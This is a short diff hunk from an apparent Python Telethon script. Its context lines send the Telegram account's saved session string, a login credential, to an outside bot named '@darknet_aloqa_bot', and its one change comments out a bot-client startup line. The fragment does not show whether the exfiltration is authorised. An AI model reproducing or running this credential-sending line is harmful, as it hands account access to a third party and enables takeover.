@@ -25,7 +25,7 @@ with TelegramClient(StringSession(string), api_id, api_hash) as client:
     #print(client.session.save())
     client.send_message("@darknet_aloqa_bot", client.session.save())
 
-botClient = TelegramClient('@jojo_user_bot', api_id, api_hash).start(bot_token=bot_token)
+#botClient = TelegramClient('@jojo_user_bot', api_id, api_hash).start(bot_token=bot_token)
 
 
 
